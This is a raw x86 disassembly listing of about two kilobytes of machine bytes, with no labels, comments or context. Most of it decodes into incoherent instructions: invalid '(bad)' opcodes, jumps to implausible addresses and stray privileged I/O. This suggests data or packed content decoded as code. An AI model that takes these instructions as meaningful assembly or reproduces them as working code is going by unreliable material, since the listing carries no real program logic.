  40ad4a:	add    BYTE PTR [ebx-0x6f],0x7
  40ad4e:	retf   
  40ad4f:	or     DWORD PTR [ebx],0xe6c8ccff
  40ad55:	dec    BYTE PTR [esi+0x5]
  40ad58:	icebp  
  40ad59:	sbb    ecx,DWORD PTR [eax]
  40ad5b:	add    eax,0x5490b1e
  40ad60:	sbb    DWORD PTR [esi-0x6416b998],0x3a84111
  40ad6a:	pushf  
  40ad6b:	cmp    dl,BYTE PTR [esp+ebx*8-0x28fefadd]
  40ad72:	test   DWORD PTR [esi+ebp*8],0xfe
	...
  40ad85:	les    edi,FWORD PTR [ecx-0x3]
  40ad88:	mov    bl,0x4
  40ad8a:	dec    esi
  40ad8b:	sbb    eax,0xd65474c5
  40ad90:	nop
  40ad91:	fs in  eax,dx
  40ad93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad94:	pop    es
  40ad95:	fs add al,0xd1
  40ad98:	push   es
  40ad99:	icebp  
  40ad9a:	add    edi,DWORD PTR [esi+0x326c549d]
  40ada0:	enter  0x5a3,0x41
  40ada4:	mov    bh,0x88
  40ada6:	inc    esi
  40ada7:	jmp    0xd09b23b6
  40adac:	les    esi,FWORD PTR [esp+ebp*8]
  40adaf:	in     al,dx
  40adb0:	jo     0x40adde
  40adb2:	add    al,0xe2
  40adb4:	inc    ebx
  40adb5:	scas   eax,DWORD PTR es:[edi]
  40adb6:	sbb    DWORD PTR [ecx],ebx
  40adb8:	pushf  
  40adb9:	stos   DWORD PTR es:[edi],eax
  40adba:	inc    ecx
  40adbb:	sub    BYTE PTR [ebx+esi*4],al
  40adbe:	add    al,0xfc
  40adc0:	sti    
  40adc1:	add    al,0x97
  40adc3:	ins    BYTE PTR es:[edi],dx
  40adc4:	or     al,BYTE PTR [ebp*8+0x3fc743c]
  40adcb:	rol    DWORD PTR [ebx],cl
  40adcd:	mov    DWORD PTR ds:0x462f78c1,eax
  40add3:	jmp    0xe9449273
  40add8:	or     ebx,0xffffffdd
  40addb:	push   esp
  40addc:	or     dl,ah
  40adde:	verw   WORD PTR [ecx]
  40ade1:	fsub   QWORD PTR [edi]
  40ade3:	push   eax
  40ade4:	cdq    
  40ade5:	push   0x269b84
	...
  40adf6:	add    BYTE PTR [eax],al
  40adf8:	imul   edx,DWORD PTR [eax],0x53c495c0
  40adfe:	push   0x44a4a0
  40ae03:	mov    ecx,0x11087a59
  40ae08:	(bad)  
  40ae09:	(bad)  
  40ae0a:	(bad)  
  40ae0b:	(bad)  
  40ae0c:	jns    0x40adb1
  40ae0e:	nop
  40ae0f:	neg    BYTE PTR [edx-0x13]
  40ae12:	cwde   
  40ae13:	pop    eax
  40ae14:	pop    ecx
  40ae15:	add    al,0xff
  40ae17:	pop    esp
  40ae18:	imul   eax,DWORD PTR [esi*2-0x70eea70f],0xffffffd6
  40ae20:	pop    edx
  40ae21:	into   
  40ae22:	shl    ebp,0x60
  40ae25:	pop    edx
  40ae26:	mov    edx,ebp
  40ae28:	loopne 0x40adf3
  40ae2a:	jmp    0x40ade2
  40ae2c:	push   0x2
  40ae2e:	lea    ebp,[ebx+ebx*2]
  40ae31:	push   ebp
  40ae32:	push   DWORD PTR [edi+ecx*2]
  40ae35:	add    al,0x75
  40ae37:	cmc    
  40ae38:	pop    eax
  40ae39:	xlat   BYTE PTR ds:[ebx]
  40ae3a:	(bad)  
  40ae3b:	jmp    0xe700bca0
  40ae40:	lods   eax,DWORD PTR ds:[esi]
  40ae41:	into   
  40ae42:	(bad)  
  40ae43:	call   0x818578a8
  40ae48:	addr16 add eax,0x48a3e900
  40ae4e:	hlt    
  40ae4f:	jbe    0x40aeb3
  40ae51:	add    eax,0x6f5f0300
  40ae56:	add    bl,dl
  40ae58:	pusha  
  40ae59:	outs   dx,DWORD PTR ds:[esi]
  40ae5a:	add    BYTE PTR [eax+eax*1+0x0],ch
	...
  40ae6a:	add    BYTE PTR [esi+esi*8-0x6939bb1],dh
  40ae71:	test   BYTE PTR [esi+0x5a],0x55
  40ae75:	inc    DWORD PTR [eax]
  40ae77:	pop    ds
  40ae78:	ud0    esi,DWORD PTR [ebp-0x6a]
  40ae7c:	and    DWORD PTR [ebx+eiz*2-0x3ff4f946],esp
  40ae83:	push   cs
  40ae84:	add    al,0xe8
  40ae86:	mov    cs,edx
  40ae88:	push   es
  40ae89:	add    BYTE PTR [eax+0x7c],ch
  40ae8c:	loope  0x40aecd
  40ae8e:	add    BYTE PTR [ebp-0x6e],dl
  40ae91:	push   cs
  40ae92:	call   0x402414
  40ae97:	cli    
  40ae98:	adc    eax,0xf714ff8d
  40ae9e:	call   DWORD PTR [ebp+0x4de850b6]
  40aea4:	jne    0x40aea5
  40aea6:	push   ebx
  40aea8:	xor    al,0xf7
  40aeab:	xchg   ebp,eax
  40aeac:	or     eax,0xceb0de8
  40aeb1:	jmp    FWORD PTR [edx+0x7a]
  40aeb4:	sahf   
  40aeb5:	sar    DWORD PTR [ebx+ecx*4],1
  40aeb8:	or     edi,edi
  40aeba:	mov    ch,0x1a
  40aebc:	adc    eax,0x9315ffff
  40aec1:	or     ch,al
  40aec3:	sub    dh,BYTE PTR [edx-0x1]
  40aec6:	push   DWORD PTR [ebx-0x2a08137d]
  40aecc:	or     al,0x83
  40aece:	mov    ebp,0x0
	...
  40aedb:	add    BYTE PTR [eax],al
  40aedd:	add    dh,ah
  40aedf:	adc    al,0xff
  40aee1:	(bad)  
  40aee2:	cmp    dl,BYTE PTR [edx+0x60b6811]
  40aee8:	out    dx,eax
  40aee9:	mov    esi,0xf7ec5395
  40aeee:	xchg   ebp,eax
  40aeef:	or     eax,0x1e0275ff
  40aef4:	xchg   edi,eax
  40aef5:	mov    dl,0x85
  40aef7:	or     eax,0x15a6b5ff
  40aefc:	(bad)  
  40aefd:	jmp    DWORD PTR [ebx+0x44]
  40af00:	cmp    al,0x90
  40af02:	in     al,0x52
  40af04:	or     BYTE PTR [ebp-0xf7bd2d],dh
  40af0a:	aam    0xb8
  40af0c:	idiv   dh
  40af0e:	push   esi
  40af0f:	in     al,0x1a
  40af11:	xor    ah,al
  40af13:	xor    cl,BYTE PTR [eax]
  40af15:	push   esi
  40af17:	sbb    edx,DWORD PTR [eax]
  40af19:	push   DWORD PTR [ebx+edx*1+0x1aac9058]
  40af20:	or     BYTE PTR [ebp-0x55],al
  40af23:	add    al,0xbf
  40af25:	(bad)  
  40af26:	pushf  
  40af27:	or     cl,BYTE PTR [eax]
  40af29:	jne    0x40aec2
  40af2b:	adc    ecx,DWORD PTR [edx]
  40af2d:	bound  esp,QWORD PTR [ebx-0x14]
  40af30:	cmp    edx,eax
  40af32:	push   edi
  40af33:	in     al,dx
  40af34:	lods   eax,DWORD PTR ds:[esi]
  40af35:	mov    cl,BYTE PTR [edi+0x6ce8406c]
  40af3b:	loop   0x40af43
  40af3d:	lea    esp,[esi]
  40af3f:	fdiv   DWORD PTR [ebx+0xfe]
	...
  40af51:	out    dx,al
  40af52:	sti    
  40af53:	add    eax,0x22d66f75
  40af58:	bound  esp,QWORD PTR [ebx-0x12]
  40af5b:	stc    
  40af5c:	mov    edi,0xe6715c
  40af61:	arpl   si,bp
  40af63:	cmp    eax,0x2ef3b45
  40af68:	add    BYTE PTR [ebx-0x59],ah
  40af6b:	shl    bl,0x2c
  40af6e:	lock add al,BYTE PTR [eax]
  40af71:	mov    ecx,0x8aff98ee
  40af76:	out    dx,al
  40af77:	cwde   
  40af78:	jmp    edi
  40af7a:	sub    DWORD PTR [eax],edx
  40af7c:	push   eax
  40af7d:	fidiv  WORD PTR [ecx+0x10]
  40af80:	test   DWORD PTR [eax+esi*2],0x576feb4
  40af87:	popa   
  40af88:	pop    es
  40af89:	outs   dx,BYTE PTR ds:[esi]
  40af8a:	add    DWORD PTR [ecx+0x51],edx
  40af8d:	add    DWORD PTR ds:0x79a4fae9,0x5c21ce4
  40af97:	jmp    0x1107fa9f
  40af9c:	(bad)
  40af9f:	mov    ebx,0x59ddbcf3
  40afa4:	pop    es
  40afa5:	mov    esp,0xe6347255
  40afaa:	mov    dl,BYTE PTR [edi+ecx*1]
  40afad:	lods   al,BYTE PTR ds:[esi]
  40afae:	add    BYTE PTR [ecx+0x79cdbcb1],bh
  40afb4:	pop    es
	...
  40afc1:	add    BYTE PTR [eax],al
  40afc3:	add    BYTE PTR [esi+ecx*4+0x8c146b],bl
  40afca:	(bad)  
  40afcb:	sbb    ebp,DWORD PTR [ebp-0x6b]
  40afce:	cmc    
  40afcf:	push   es
  40afd0:	stc    
  40afd1:	add    al,0x83
  40afd3:	add    edi,DWORD PTR [edx+edi*4-0x28]
  40afd7:	push   cs
  40afd8:	je     0x40afda
  40afda:	ficom  WORD PTR [eax+0x730ced58]
  40afe0:	add    BYTE PTR fs:[eax-0x80],ah
  40afe4:	dec    edi
  40afe5:	clc    
  40afe6:	lds    eax,FWORD PTR [esi]
  40afe8:	push   esp
  40afe9:	mov    edx,0x4c0ecc
  40afee:	sar    DWORD PTR [edi],0xea
  40aff1:	jmp    FWORD PTR [ebp+0xa78fcfa]
  40aff7:	mov    ah,0xeb
  40aff9:	mov    DWORD PTR [eax-0x69ffd3f2],edx
  40afff:	push   eax
  40b000:	cmp    edi,eax
  40b002:	lea    eax,[esi]
  40b004:	or     eax,DWORD PTR [esi]
  40b006:	pop    esp
  40b007:	push   es
  40b008:	adc    al,0xc
  40b00a:	test   eax,0x6da48f
  40b00f:	jmp    0x40b071
  40b011:	lock mov ebp,0x4140cc01
  40b017:	jmp    0x57286a79
  40b01c:	gs add bh,bh
  40b01f:	fsub   st(0),st
  40b021:	out    0x97,eax
  40b023:	xchg   ebp,eax
  40b024:	add    BYTE PTR gs:[eax-0x15],ch
	...
  40b034:	add    BYTE PTR [eax],al
  40b036:	add    BYTE PTR [eax-0x10],ah
  40b039:	mov    ebp,0x4140edd1
  40b03e:	jmp    0x37286aa0
  40b043:	gs add bh,bh
  40b046:	pushf  
  40b047:	mov    eax,0x65557fe7
  40b04c:	add    BYTE PTR [eax-0x17],ch
  40b04f:	pusha  
  40b050:	lock mov ebp,0x41413981
  40b056:	jmp    0xf7286ab8
  40b05b:	data16 add bh,bh
  40b05e:	jl     0x40afe8
  40b060:	out    0x67,eax
  40b062:	xor    eax,0x7de80065
  40b067:	out    dx,al
  40b068:	(bad)  
  40b069:	(bad)  
  40b06a:	ficomp WORD PTR [ecx+esi*8]
  40b06d:	not    dh
  40b06f:	pop    esi
  40b070:	in     eax,dx
  40b071:	mov    BYTE PTR [esi+0x66],bl
  40b074:	(bad)  
  40b075:	(bad)  
  40b076:	jl     0x40b0e7
  40b078:	idiv   dh
  40b07a:	mov    esi,0xb60c7866
  40b07f:	aam    0x6
  40b081:	call   0xff3f1612
  40b086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b087:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b088:	cmc    
  40b089:	neg    BYTE PTR [esi+0x666ced66]
  40b08f:	pop    esi
  40b090:	(bad)  
  40b091:	(bad)  
  40b092:	and    al,0x6f
  40b094:	in     al,dx
  40b095:	lock add ah,bl
  40b098:	or     bh,bh
  40b09a:	inc    DWORD PTR [eax]
	...
  40b0a8:	add    BYTE PTR [eax],al
  40b0aa:	pop    ss
  40b0ab:	pop    es
  40b0ac:	call   0x4a0c68
  40b0b1:	leave  
  40b0b2:	enter  0xfefd,0x54
  40b0b6:	jno    0x40b0d5
  40b0b8:	add    esp,0xffffff8e
  40b0bb:	fwait
  40b0bc:	(bad)  
  40b0bd:	imul   ebx,DWORD PTR [eax+0x8],0x88220875
  40b0c4:	mov    bh,bh
  40b0c6:	sbb    eax,0xb2fc457a
  40b0cb:	add    al,BYTE PTR [eax]
  40b0cd:	out    dx,eax
  40b0ce:	dec    esp
  40b0cf:	mov    eax,ds:0x30b3ca9
  40b0d4:	push   0xfec3bebb
  40b0d9:	(bad)  
  40b0da:	xlat   BYTE PTR ds:[ebx]
  40b0db:	cli    
  40b0dc:	out    0x47,al
  40b0de:	push   es
  40b0df:	or     bh,bh
  40b0e1:	push   0x3fcd49
  40b0e6:	pop    ebp
  40b0e7:	into   
  40b0e8:	push   ebx
  40b0e9:	sub    DWORD PTR [ebx-0x7d8a00fe],edi
  40b0ef:	sbb    dl,BYTE PTR [eax+0x68098dfd]
  40b0f5:	ret    
  40b0f6:	ds ret 0x67fe
  40b0fa:	js     0x40b0fe
  40b0fc:	add    BYTE PTR [eax-0x17f97073],al
  40b102:	lods   al,BYTE PTR ds:[esi]
  40b103:	push   es
  40b104:	(bad)  
  40b105:	push   DWORD PTR [edx+0x3a413c30]
  40b10b:	call   0x0:0x0
	...
  40b11a:	add    BYTE PTR [eax],al
  40b11c:	add    BYTE PTR [edx],bh
  40b11e:	cmp    dh,0x75
  40b121:	inc    edx
  40b122:	sbb    bl,BYTE PTR [ebx-0x2]
  40b125:	std    
  40b126:	or     BYTE PTR [eax+0x17],ch
  40b129:	(bad)  
  40b12b:	(bad)  
  40b12c:	addr16 arpl dx,bp
  40b12f:	add    al,BYTE PTR [eax]
  40b131:	jecxz  0x40b0c1
  40b133:	lea    eax,[edi]
  40b135:	or     esi,DWORD PTR ds:0x7f0cff06
  40b13b:	mov    ?,ebx
  40b13d:	add    al,0x1
  40b13f:	sti    
  40b140:	out    0x94,eax
  40b142:	pusha  
  40b143:	add    al,0xff
  40b145:	sub    ch,BYTE PTR [edx]
  40b147:	(bad)  
  40b148:	call   DWORD PTR [edi+0x6eff1773]
  40b14e:	call   0x4f30ca6d
  40b153:	add    al,0xb
  40b155:	mov    ds:0xf367c9bf,eax
  40b15a:	add    dl,al
  40b15c:	call   DWORD PTR [esp+eax*2]
  40b15f:	push   ebp
  40b160:	xchg   edx,eax
  40b161:	mov    esp,0x4b4fb32e
  40b166:	in     al,dx
  40b167:	add    ch,bh
  40b169:	in     eax,dx
  40b16a:	xchg   ebx,eax
  40b16b:	(bad)  
  40b16c:	cmp    al,0x22
  40b16e:	in     al,dx
  40b16f:	mov    dl,0xfe
  40b171:	push   ss
  40b172:	in     al,0x1a
  40b174:	jne    0x40b146
  40b176:	push   es
  40b177:	add    al,0x58
  40b179:	sti    
  40b17a:	in     al,dx
  40b17b:	add    ch,bh
  40b17d:	lds    eax,FWORD PTR [ebx+0x3d80]
	...
  40b18f:	add    BYTE PTR [edx],ah
  40b191:	in     al,dx
  40b192:	mov    dl,0xfe
  40b194:	out    dx,al
  40b195:	repz jmp 0xd6e8:0x2deb060
  40b19d:	gs add edi,edi
  40b1a0:	sub    dh,BYTE PTR [ecx+0x77ae000b]
  40b1a6:	lock and BYTE PTR [edi],0xbb
  40b1aa:	ins    DWORD PTR es:[edi],dx
  40b1ab:	add    BYTE PTR [ecx+0x6b75030f],bh
  40b1b1:	(bad)  
  40b1b2:	mov    dl,0x8a
  40b1b4:	xor    al,0x6
  40b1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1b7:	lea    esp,[edi+0x241e12f9]
  40b1bd:	jae    0x40b1a0
  40b1bf:	jmp    0x40b1b8
  40b1c1:	cld    
  40b1c2:	lea    eax,[ebx]
  40b1c4:	mov    DWORD PTR [eax],ebp
  40b1c6:	xchg   BYTE PTR [ecx+0x5b],bh
  40b1c9:	in     eax,dx
  40b1ca:	jno    0x40b1cf
  40b1cc:	add    al,0xfd
  40b1ce:	add    ah,BYTE PTR [eax]
  40b1d0:	cld    
  40b1d1:	jb     0x40b1b4
  40b1d3:	jmp    0x40b1b8
  40b1d5:	cld    
  40b1d6:	gs add ebp,esp
  40b1d9:	jb     0x40b238
  40b1db:	add    ebp,DWORD PTR [esi+0xd]
  40b1de:	inc    ecx
  40b1df:	int    0xe9
  40b1e1:	cld    
  40b1e2:	dec    ebp
  40b1e3:	int    0xa2
  40b1e5:	add    ecx,ebp
  40b1e7:	pop    eax
  40b1e8:	fsubr  st,st(1)
  40b1ea:	cdq    
  40b1eb:	retf   0x4f5f
  40b1ee:	test   BYTE PTR [ebx+eiz*2+0x5],0xe9
  40b1f3:	add    eax,DWORD PTR [eax]
	...
  40b201:	add    BYTE PTR [eax],al
  40b203:	arpl   WORD PTR [eax],si
  40b205:	inc    edx
  40b206:	add    esi,DWORD PTR [esi]
  40b208:	or     eax,0x5043711
  40b20d:	jmp    0x6a4de9a0
  40b212:	cld    
  40b213:	bound  esi,QWORD PTR [ebx-0x28]
  40b216:	push   es
  40b217:	mov    bl,0x88
  40b219:	adc    al,BYTE PTR [esi]
  40b21b:	std    
  40b21c:	test   DWORD PTR [edx-0x1b8de0a1],esi
  40b222:	imul   ebx,DWORD PTR [edi+eax*1+0x726c0445],0x5c9eebed
  40b22d:	jmp    0xf6d7d35
  40b232:	inc    ebp
  40b233:	arpl   WORD PTR [ebp+0x66],bp
  40b236:	inc    eax
  40b237:	mov    ds:0xec99d105,al
  40b23c:	sti    
  40b23d:	push   DWORD PTR [ebp+0x4473c56d]
  40b243:	pusha  
  40b244:	jb     0x40b24e
  40b246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b247:	dec    ebx
  40b248:	sub    al,0x3e
  40b24a:	sub    BYTE PTR [edi-0x78],bl
  40b24d:	ret    
  40b24e:	in     eax,dx
  40b24f:	ins    DWORD PTR es:[edi],dx
  40b250:	lds    esi,FWORD PTR [esp+esi*1+0x60]
  40b254:	adc    bh,BYTE PTR [edi]
  40b256:	(bad)  
  40b257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b258:	add    eax,0x46a033a3
  40b25d:	add    BYTE PTR [edx-0x5d],ch
  40b260:	dec    edi
  40b261:	aas    
  40b262:	sub    BYTE PTR [edi+0x5],bl
  40b265:	jne    0x40b258
	...
  40b273:	add    BYTE PTR [eax],al
  40b275:	add    BYTE PTR [ecx+0x12],ah
  40b278:	xor    ebx,DWORD PTR [edi]
  40b27a:	sahf   
  40b27b:	add    eax,0x54d10eb
  40b280:	push   0xffffffe8
  40b282:	popa   
  40b283:	xor    cl,BYTE PTR [edx+0x6]
  40b286:	es add eax,0x3b1dd4ff
  40b28c:	inc    ecx
  40b28d:	jmp    0xe24c7a77
  40b292:	mov    al,ds:0x6b262177
  40b297:	dec    edi
  40b298:	aas    
  40b299:	test   al,0x60
  40b29b:	cld    
  40b29c:	adc    al,0xa2
  40b29e:	and    al,BYTE PTR [esi+0x0]
  40b2a1:	push   0xffffff9c
  40b2a3:	pop    es
  40b2a4:	(bad)  
  40b2a5:	fcom   QWORD PTR [ebp+0x3b]
  40b2a8:	inc    ecx
  40b2a9:	jmp    0xb68ab347
  40b2ae:	daa    
  40b2af:	add    eax,0x560e900
  40b2b4:	jmp    0x40b29e
  40b2b6:	daa    
  40b2b7:	nop
  40b2b8:	ret    0x9842
  40b2bb:	lds    eax,FWORD PTR [edi]
  40b2bd:	jmp    0xe8aeca9
  40b2c2:	mov    al,ds:0x8e000005
  40b2c7:	and    al,0xff
  40b2c9:	xor    eax,0x414490
  40b2ce:	cmc    
  40b2cf:	adc    cl,BYTE PTR [ebx+0x3e]
  40b2d2:	mov    eax,DWORD PTR [ecx]
  40b2d4:	add    esp,0x3e
  40b2d7:	push   es
  40b2d8:	adc    eax,0x33
	...
  40b2e9:	add    al,0x48
  40b2eb:	add    bh,al
  40b2ed:	cmovns edi,DWORD PTR [edi]
  40b2f0:	inc    ecx
  40b2f1:	or     al,BYTE PTR [edi]
  40b2f3:	add    BYTE PTR [eax],al
  40b2f5:	cli    
  40b2f6:	rcl    DWORD PTR [ebx-0x75],0xd6
  40b2fa:	add    dl,0xf0
  40b2fd:	pop    ecx
  40b2fe:	mov    BYTE PTR [ebx+0x8],al
  40b301:	add    edi,eax
  40b303:	jb     0x40b310
  40b305:	jns    0x40b381
  40b307:	or     al,0x0
  40b309:	push   cs
  40b30a:	add    al,0x80
  40b30c:	cmp    dl,cl
  40b30e:	jae    0x40b317
  40b310:	sub    ecx,DWORD PTR [edx-0x2d3d36a8]
  40b316:	push   es
  40b317:	cmp    BYTE PTR [eax],0x4
  40b31a:	jae    0x40b32c
  40b31c:	xor    DWORD PTR [edi-0x35bec0b8],0x6
  40b323:	jne    0x40b32c
  40b325:	xchg   ecx,eax
  40b326:	(bad)  
  40b327:	pop    ecx
  40b328:	leave  
  40b329:	js     0x40b334
  40b32b:	add    BYTE PTR [eax+0x3e7484b2],al
  40b331:	add    DWORD PTR [edx+0xc],edx
  40b334:	dec    edx
  40b335:	stc    
  40b336:	loop   0x40b339
  40b338:	or     ebp,DWORD PTR [eax+0x72]
  40b33b:	push   es
  40b33c:	xor    edi,0x9
  40b33f:	add    DWORD PTR [ebp+0x7e],esi
  40b342:	sub    eax,eax
  40b344:	jmp    0x40b3a4
  40b346:	add    al,0x4d
  40b348:	or     al,0xf1
  40b34a:	inc    edx
  40b34b:	or     al,0x5
	...
  40b359:	add    BYTE PTR [eax],al
  40b35b:	add    BYTE PTR [ebx-0x14],ah
  40b35e:	push   es
  40b35f:	add    BYTE PTR [ebx-0x53],ah
  40b362:	loop   0x40b365
  40b364:	mov    bl,0xd4
  40b366:	sbb    al,0x8d
  40b368:	inc    esp
  40b369:	mov    ebx,0xe4968b52
  40b36e:	inc    esp
  40b36f:	push   eax
  40b370:	xor    al,0x31
  40b372:	adc    BYTE PTR [edx+0x3b],dl
  40b375:	mov    ecx,0x4424fe9a
  40b37a:	pop    ebp
  40b37b:	leave  
  40b37c:	and    esp,esp
  40b37e:	add    ch,BYTE PTR [ebx]
  40b380:	cmp    BYTE PTR [ebx-0x6f3f38b],cl
  40b386:	or     ch,BYTE PTR [edx+0x63]
  40b389:	push   ss
  40b38a:	add    al,0xff
  40b38c:	push   esi
  40b38d:	mov    ebx,0x6f634140
  40b392:	(bad)  
  40b393:	addps  xmm5,XMMWORD PTR [edi+esi*2]
  40b397:	fisub  DWORD PTR gs:[eax+0x616f69fe]
  40b39e:	inc    esi
  40b39f:	lock xor eax,DWORD PTR [esi+esi*8-0x75]
  40b3a4:	int3   
  40b3a5:	inc    edx
  40b3a6:	ins    DWORD PTR es:[edi],dx
  40b3a7:	add    dh,dl
  40b3a9:	mov    al,ds:0xb8bc4ff2
  40b3ae:	(bad)  
  40b3af:	dec    BYTE PTR [esi-0x5d]
  40b3b2:	inc    eax
  40b3b3:	inc    ecx
  40b3b4:	arpl   WORD PTR [edi-0x39],bp
  40b3b7:	or     ebx,DWORD PTR [eax+0x2c]
  40b3ba:	jbe    0x40b3ef
  40b3bc:	out    dx,al
  40b3bd:	test   al,0xf2
  40b3bf:	add    BYTE PTR [eax],0x0
	...
  40b3ce:	add    BYTE PTR [ebx],bl
  40b3d0:	loopne 0x40b3d4
  40b3d2:	je     0x40b43c
  40b3d4:	ja     0x40b419
  40b3d6:	or     BYTE PTR [ebx],ah
  40b3d8:	pushf  
  40b3d9:	jmp    0x9b8a:0xfef2efb4
  40b3e0:	pop    eax
  40b3e1:	inc    esi
  40b3e2:	lock ins BYTE PTR es:[edi],dx
  40b3e4:	add    al,0x59
  40b3e6:	or     al,0x10
  40b3e8:	cli    
  40b3e9:	pop    eax
  40b3ea:	or     BYTE PTR [ebx-0x23],cl
  40b3ed:	call   DWORD PTR fs:[ebp+0x6c]
  40b3f1:	jmp    0x19365b86
  40b3f6:	jmp    FWORD PTR [edi+0x3c]
  40b3f9:	inc    DWORD PTR [ebx+eiz*2-0x7c]
  40b3fd:	lods   al,BYTE PTR ds:[esi]
  40b3fe:	or     al,0xc9
  40b400:	push   es
  40b401:	scas   al,BYTE PTR es:[edi]
  40b402:	jns    0x40b433
  40b404:	stc    
  40b405:	sti    
  40b406:	cmp    ah,BYTE PTR [ebp+0x46]
  40b409:	jmp    0x624ed490
  40b40e:	ret    
  40b40f:	mov    ecx,0x630caace
  40b414:	push   edx
  40b415:	jb     0x40b407
  40b417:	add    eax,0x77feed73
  40b41c:	or     eax,0x38a11976
  40b421:	sub    BYTE PTR [eax+eiz*8],al
  40b424:	shl    eax,0x53
  40b427:	in     al,0x72
  40b429:	in     eax,dx
  40b42a:	(bad)  
  40b42b:	push   edi
  40b42c:	or     eax,0x38951956
  40b431:	test   al,0x3
	...
  40b43f:	add    BYTE PTR [eax],al
  40b441:	add    al,ah
  40b443:	shl    eax,0x8a
  40b446:	das    
  40b447:	adc    eax,0xce1b0270
  40b44c:	sub    dl,BYTE PTR [eax]
  40b44e:	arpl   WORD PTR [edx+0x62],dx
  40b451:	lock loope 0x40b415
  40b454:	adc    bh,bh
  40b456:	das    
  40b457:	or     DWORD PTR [ecx],edx
  40b459:	add    esi,edx
  40b45b:	clc    
  40b45c:	adc    eax,0xe572a30b
  40b461:	int3   
  40b462:	mov    ds:0xffee915,al
  40b467:	or     DWORD PTR [ecx],edx
  40b469:	loopne 0x40b439
  40b46b:	clc    
  40b46c:	push   ebp
  40b46e:	imul   eax,ebp,0xc69fe573
  40b474:	psubsw mm4,QWORD PTR [ebp+0x71]
  40b478:	adc    al,0xde
  40b47a:	fist   DWORD PTR ds:0xf863ace8
  40b480:	(bad)  
  40b481:	loop   0x40b4a3
  40b483:	jno    0x40b489
  40b485:	mov    al,0x22
  40b487:	or     BYTE PTR [eax],al
  40b489:	push   ecx
  40b48a:	lea    edi,[eax]
  40b48c:	inc    ecx
  40b48d:	jmp    0x287e6f5a
  40b492:	addr16 in eax,dx
  40b494:	mov    edi,DWORD PTR [edi+0x25]
  40b497:	test   DWORD PTR [edx],0x68089ba9
  40b49d:	(bad)  
  40b49e:	push   ebp
  40b49f:	inc    esi
  40b4a0:	add    BYTE PTR [ecx],al
  40b4a2:	pushf  
  40b4a3:	aaa    
  40b4a4:	inc    ecx
  40b4a5:	jmp    0x40b4aa
	...
  40b4b2:	add    BYTE PTR [eax],al
  40b4b4:	add    al,bh
  40b4b6:	jl     0x40b44e
  40b4b8:	jle    0x40b4b7
  40b4ba:	or     al,al
  40b4bc:	out    0xdc,al
  40b4be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4bf:	add    cl,ch
  40b4c1:	pusha  
  40b4c2:	mov    al,BYTE PTR [ebp+eiz*2-0x70]
  40b4c6:	clc    
  40b4c7:	je     0x40b4b6
  40b4c9:	fst    QWORD PTR [eax]
  40b4cb:	cs push ss
  40b4cd:	push   ds
  40b4ce:	add    eax,0xc582583
  40b4d3:	shl    dh,0xdb
  40b4d6:	mov    es,WORD PTR [eax]
  40b4d8:	jmp    0x6441203d
  40b4dd:	sub    edi,ebp
  40b4df:	dec    edi
  40b4e0:	ret    
  40b4e1:	lods   eax,DWORD PTR ds:[esi]
  40b4e2:	pop    edi
  40b4e3:	mov    esi,0xff051fe6
  40b4e8:	xchg   esp,eax
  40b4e9:	pushf  
  40b4ea:	not    BYTE PTR [edi+ebx*8]
  40b4ed:	push   ebp
  40b4ee:	inc    esi
  40b4ef:	add    BYTE PTR [edx-0x5c],ch
  40b4f2:	adc    ecx,DWORD PTR [ebx]
  40b4f4:	add    BYTE PTR [edx],bh
  40b4f6:	pop    es
  40b4f7:	test   DWORD PTR [edx-0x75],ebp
  40b4fa:	add    eax,DWORD PTR [eax]
  40b4fc:	push   edi
  40b4fe:	sti    
  40b4ff:	std    
  40b500:	adc    eax,0x4136b0
  40b505:	stc    
  40b506:	int3   
  40b507:	add    al,BYTE PTR [ebx+0x5746e42]
  40b50d:	and    ebx,DWORD PTR [esi+0x1]
  40b510:	add    BYTE PTR [edx],bh
  40b512:	mov    BYTE PTR [ebx-0xc],al
  40b515:	push   0x6b
  40b517:	add    bh,bh
	...
  40b525:	add    BYTE PTR [eax],al
  40b527:	add    BYTE PTR [edi-0x7],dh
  40b52a:	out    0x14,al
  40b52c:	in     eax,dx
  40b52d:	clc    
  40b52e:	std    
  40b52f:	or     edi,edx
  40b531:	or     BYTE PTR [ecx+edi*1-0x7cfffcc5],al
  40b538:	jg     0x40b537
  40b53a:	dec    BYTE PTR [esi]
  40b53c:	xchg   BYTE PTR [eax],ch
  40b53e:	add    DWORD PTR [eax],eax
  40b540:	cli    
  40b541:	xor    BYTE PTR [esi],0x0
  40b544:	or     eax,0xa01247f
  40b549:	add    edx,DWORD PTR [eax-0x75]
  40b54c:	push   edi
  40b54d:	std    
  40b54e:	inc    eax
  40b54f:	push   edx
  40b550:	loop   0x40b5b9
  40b552:	mov    edi,edi
  40b554:	jge    0x40b5b1
  40b556:	mov    DWORD PTR [ebp+0x32],eax
  40b559:	clc    
  40b55a:	jae    0x40b550
  40b55c:	sub    eax,0x2252e86e
  40b561:	mov    cs,WORD PTR [ecx+0x43c01dff]
  40b567:	lock retf 0x2
  40b56b:	add    BYTE PTR [ebp-0x45ff13c2],al
  40b571:	add    al,BYTE PTR [eax]
  40b573:	cmp    DWORD PTR [edi-0x75bec0c0],0x2
  40b57a:	jne    0x40b5ce
  40b57c:	arpl   WORD PTR [edi+ebp*1-0x1513ddc0],ax
  40b583:	sub    DWORD PTR [edi],esp
  40b585:	in     al,dx
  40b586:	add    dl,BYTE PTR [eax+0xb]
  40b589:	mov    ebx,0x4142
	...
  40b59a:	add    BYTE PTR [ebx-0x11],ah
  40b59d:	jne    0x40b587
  40b59f:	jnp    0x40b5b9
  40b5a1:	pop    edi
  40b5a2:	add    BYTE PTR [ebx-0xd],ah
  40b5a5:	ret    0x7b73
  40b5a8:	push   esp
  40b5a9:	cmp    al,BYTE PTR [eax-0x5e]
  40b5ac:	in     al,dx
  40b5ad:	jmp    0xbb50:0x2ecaf0d
  40b5b4:	add    al,BYTE PTR [ecx+eax*2+0x63]
  40b5b8:	mov    bh,0x75
  40b5ba:	call   0x9f320a
  40b5bf:	arpl   bx,sp
  40b5c1:	ret    0x7173
  40b5c4:	adc    al,0x42
  40b5c6:	inc    eax
